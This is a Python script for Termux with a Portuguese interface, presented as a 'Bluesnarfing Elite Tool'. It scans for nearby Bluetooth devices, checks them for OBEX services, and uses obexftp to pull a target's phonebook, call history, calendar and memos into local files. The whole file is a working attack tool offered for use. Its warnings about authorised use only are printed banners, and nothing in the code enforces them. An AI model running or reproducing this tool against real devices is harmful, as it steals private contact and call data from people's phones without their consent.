#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.text import Text
from rich.progress import Progress

console = Console()

class BluesnarfingTool:
    def __init__(self):
        self.required_tools = {
            'bluetoothctl': 'Ferramenta para controle Bluetooth',
            'sdptool': 'Ferramenta para descobrir serviços Bluetooth',
            'hcitool': 'Ferramenta para investigação Bluetooth',
            'obexftp': 'Cliente OBEX para transferência de arquivos'
        }
        self.missing_tools = []
        
    def mostrar_banner(self):
        banner = """
[bold blue]
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║                  BLUESNARFING ELITE TOOL                     ║
║                 [blink]v2.0 - TERMUX EDITION[/blink]                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
[/bold blue]
"""
        console.print(banner)
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS PARA TESTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def verificar_root(self):
        """Verifica se o usuário tem privilégios de root"""
        try:
            if os.geteuid() != 0:
                console.print(Panel.fit(
                    "[bold red]✗ ERRO: Este script requer privilégios de root![/bold red]\n"
                    "Execute com: [cyan]sudo python3 bluesnarfing.py[/cyan]",
                    border_style="red"
                ))
                return False
            return True
        except Exception:
            console.print(Panel.fit(
                "[bold red]✗ ERRO: Não foi possível verificar privilégios de root![/bold red]",
                border_style="red"
            ))
            return False
    
    def verificar_ferramentas(self):
        """Verifica se as ferramentas necessárias estão instaladas"""
        console.print("[yellow]Verificando ferramentas necessárias...[/yellow]")
        
        self.missing_tools = []
        for tool, description in self.required_tools.items():
            try:
                subprocess.run(['which', tool], check=True, 
                             capture_output=True, text=True)
                console.print(f"[green]✓[/green] {tool}: {description}")
            except subprocess.CalledProcessError:
                console.print(f"[red]✗[/red] {tool}: {description}")
                self.missing_tools.append(tool)
        
        return len(self.missing_tools) == 0
    
    def instalar_ferramentas(self):
        """Instala as ferramentas faltantes"""
        if not self.missing_tools:
            return True
            
        console.print(Panel.fit(
            "[bold yellow]Ferramentas faltantes detectadas![/bold yellow]",
            border_style="yellow"
        ))
        
        if not Confirm.ask("Deseja instalar automaticamente?"):
            return False
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Instalando...[/cyan]", total=len(self.missing_tools))
            
            for tool in self.missing_tools:
                try:
                    if tool == 'obexftp':
                        subprocess.run(['pkg', 'install', 'obexftp', '-y'], 
                                     check=True, capture_output=True)
                    else:
                        subprocess.run(['pkg', 'install', 'bluez-utils', '-y'], 
                                     check=True, capture_output=True)
                    progress.update(task, advance=1, description=f"Instalando {tool}")
                except subprocess.CalledProcessError as e:
                    console.print(f"[red]Erro ao instalar {tool}: {e}[/red]")
                    return False
        
        console.print("[green]✓ Todas as ferramentas instaladas com sucesso![/green]")
        return True
    
    def verificar_bluetooth(self):
        """Verifica se o Bluetooth está ativo"""
        console.print("[yellow]Verificando estado do Bluetooth...[/yellow]")
        
        try:
            result = subprocess.run(['hciconfig'], capture_output=True, text=True)
            if 'UP' in result.stdout:
                console.print("[green]✓ Bluetooth está ativo[/green]")
                return True
            else:
                console.print("[red]✗ Bluetooth não está ativo[/red]")
                console.print("[yellow]Ativando Bluetooth...[/yellow]")
                subprocess.run(['hciconfig', 'hci0', 'up'], check=True)
                return True
        except Exception as e:
            console.print(f"[red]Erro ao verificar Bluetooth: {e}[/red]")
            return False
    
    def scan_dispositivos(self):
        """Escaneia dispositivos Bluetooth próximos"""
        console.print(Panel.fit(
            "[bold]Escaneando dispositivos Bluetooth...[/bold]",
            border_style="blue"
        ))
        
        try:
            with Progress() as progress:
                task = progress.add_task("[cyan]Escaneando...[/cyan]", total=100)
                
                # Comando para scan de dispositivos
                scan_cmd = ['hcitool', 'scan', '--flush']
                result = subprocess.run(scan_cmd, capture_output=True, text=True, timeout=60)
                
                for i in range(10):
                    time.sleep(0.1)
                    progress.update(task, advance=10)
                
                dispositivos = []
                lines = result.stdout.split('\n')[1:]  # Pular cabeçalho
                
                for line in lines:
                    if line.strip():
                        parts = line.split('\t')
                        if len(parts) >= 2:
                            mac = parts[0].strip()
                            nome = parts[1].strip() if len(parts) > 1 else "Desconhecido"
                            dispositivos.append((mac, nome))
                
                return dispositivos
                
        except subprocess.TimeoutExpired:
            console.print("[red]✗ Timeout no scan de dispositivos[/red]")
            return []
        except Exception as e:
            console.print(f"[red]Erro no scan: {e}[/red]")
            return []
    
    def verificar_servicos(self, mac_address):
        """Verifica serviços disponíveis no dispositivo"""
        console.print(f"[yellow]Verificando serviços em {mac_address}...[/yellow]")
        
        try:
            result = subprocess.run(['sdptool', 'browse', mac_address], 
                                  capture_output=True, text=True, timeout=30)
            
            servicos = []
            for line in result.stdout.split('\n'):
                if 'OBEX' in line or 'Object Push' in line:
                    servicos.append(line.strip())
            
            return servicos
        except Exception as e:
            console.print(f"[red]Erro ao verificar serviços: {e}[/red]")
            return []
    
    def executar_bluesnarfing(self, mac_address):
        """Executa o ataque Bluesnarfing"""
        console.print(Panel.fit(
            f"[bold red]INICIANDO BLUESNARFING EM {mac_address}[/bold red]",
            border_style="red"
        ))
        
        if not Confirm.ask("Confirmar ataque?"):
            return False
        
        arquivos_alvo = [
            'telecom/pb.vcf',    # Agenda telefônica
            'telecom/ich.vcf',   # Histórico de chamadas
            'telecom/cal.vcs',   # Calendário
            'telecom/memo.vcs'   # Lembretes
        ]
        
        arquivos_extraidos = []
        
        with Progress() as progress:
            task = progress.add_task("[red]Extraindo arquivos...[/red]", total=len(arquivos_alvo))
            
            for arquivo in arquivos_alvo:
                try:
                    destino = f"extraido_{mac_address.replace(':', '')}_{arquivo.split('/')[-1]}"
                    cmd = [
                        'obexftp', '-b', mac_address, '-B', '10', 
                        '-g', arquivo, '-v', '-t', '10', '-o', destino
                    ]
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                    
                    if os.path.exists(destino) and os.path.getsize(destino) > 0:
                        arquivos_extraidos.append(destino)
                        console.print(f"[green]✓ {arquivo} extraído[/green]")
                    else:
                        console.print(f"[yellow]✗ {arquivo} não encontrado[/yellow]")
                    
                    progress.update(task, advance=1)
                    
                except subprocess.TimeoutExpired:
                    console.print(f"[yellow]Timeout em {arquivo}[/yellow]")
                except Exception as e:
                    console.print(f"[red]Erro em {arquivo}: {e}[/red]")
        
        return arquivos_extraidos
    
    def mostrar_menu_principal(self):
        """Menu principal da ferramenta"""
        while True:
            console.clear()
            self.mostrar_banner()
            
            # Verificações iniciais
            if not self.verificar_root():
                sys.exit(1)
            
            if not self.verificar_ferramentas():
                if not self.instalar_ferramentas():
                    console.print("[red]Ferramentas necessárias não disponíveis[/red]")
                    sys.exit(1)
            
            if not self.verificar_bluetooth():
                console.print("[red]Não foi possível ativar o Bluetooth[/red]")
                sys.exit(1)
            
            # Menu de opções
            tabela = Table(
                title="[bold cyan]MENU PRINCIPAL - BLUESNARFING[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Ação", style="green")
            tabela.add_column("Descrição", style="white")
            
            tabela.add_row("1", "Scan Dispositivos", "Descobrir dispositivos Bluetooth")
            tabela.add_row("2", "Verificar Serviços", "Listar serviços OBEX disponíveis")
            tabela.add_row("3", "Executar Bluesnarfing", "Extrair dados de dispositivo")
            tabela.add_row("4", "Verificar Ferramentas", "Verificar dependências")
            tabela.add_row("0", "Sair", "Encerrar o programa")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4"],
                show_choices=False
            )
            
            if escolha == "1":
                self.menu_scan()
            elif escolha == "2":
                self.menu_servicos()
            elif escolha == "3":
                self.menu_bluesnarfing()
            elif escolha == "4":
                self.verificar_ferramentas()
                input("\nPressione Enter para continuar...")
            elif escolha == "0":
                self.sair()
    
    def menu_scan(self):
        """Menu de scan de dispositivos"""
        console.clear()
        console.print(Panel.fit(
            "[bold]ESCANEAMENTO DE DISPOSITIVOS BLUETOOTH[/bold]",
            border_style="blue"
        ))
        
        dispositivos = self.scan_dispositivos()
        
        if not dispositivos:
            console.print("[red]Nenhum dispositivo encontrado[/red]")
            input("\nPressione Enter para continuar...")
            return
        
        tabela = Table(
            title="[bold]Dispositivos Encontrados[/bold]",
            show_header=True,
            header_style="bold green"
        )
        tabela.add_column("#", style="cyan", width=5)
        tabela.add_column("Endereço MAC", style="yellow")
        tabela.add_column("Nome", style="white")
        
        for i, (mac, nome) in enumerate(dispositivos, 1):
            tabela.add_row(str(i), mac, nome)
        
        console.print(tabela)
        input("\nPressione Enter para continuar...")
    
    def menu_servicos(self):
        """Menu de verificação de serviços"""
        console.clear()
        console.print(Panel.fit(
            "[bold]VERIFICAÇÃO DE SERVIÇOS OBEX[/bold]",
            border_style="blue"
        ))
        
        mac_address = Prompt.ask("[yellow]?[/yellow] Digite o endereço MAC do dispositivo")
        
        servicos = self.verificar_servicos(mac_address)
        
        if not servicos:
            console.print("[red]Nenhum serviço OBEX encontrado[/red]")
        else:
            console.print("[green]Serviços OBEX encontrados:[/green]")
            for servico in servicos:
                console.print(f"  • {servico}")
        
        input("\nPressione Enter para continuar...")
    
    def menu_bluesnarfing(self):
        """Menu de execução do Bluesnarfing"""
        console.clear()
        console.print(Panel.fit(
            "[bold red]EXECUÇÃO DE BLUESNARFING[/bold red]",
            border_style="red"
        ))
        
        console.print(Panel.fit(
            "[bold yellow]⚠️ AVISO: Esta operação é detectável e pode ser ilegal![/bold yellow]",
            border_style="yellow"
        ))
        
        if not Confirm.ask("Continuar com o ataque?"):
            return
        
        mac_address = Prompt.ask("[yellow]?[/yellow] Digite o endereço MAC do alvo")
        
        # Verificar se o dispositivo tem serviços OBEX
        servicos = self.verificar_servicos(mac_address)
        if not servicos:
            console.print("[red]Dispositivo não possui serviços OBEX vulneráveis[/red]")
            input("\nPressione Enter para continuar...")
            return
        
        # Executar o ataque
        arquivos = self.executar_bluesnarfing(mac_address)
        
        if arquivos:
            console.print(Panel.fit(
                f"[green]✓ Ataque concluído! {len(arquivos)} arquivos extraídos[/green]",
                border_style="green"
            ))
            for arquivo in arquivos:
                console.print(f"  • {arquivo}")
        else:
            console.print(Panel.fit(
                "[red]✗ Nenhum arquivo foi extraído[/red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def sair(self):
        """Finaliza o programa"""
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: BLUESNARFING É ILEGAL SEM AUTORIZAÇÃO! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Encerrando ferramenta...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        tool = BluesnarfingTool()
        tool.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Operação cancelada pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro crítico: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
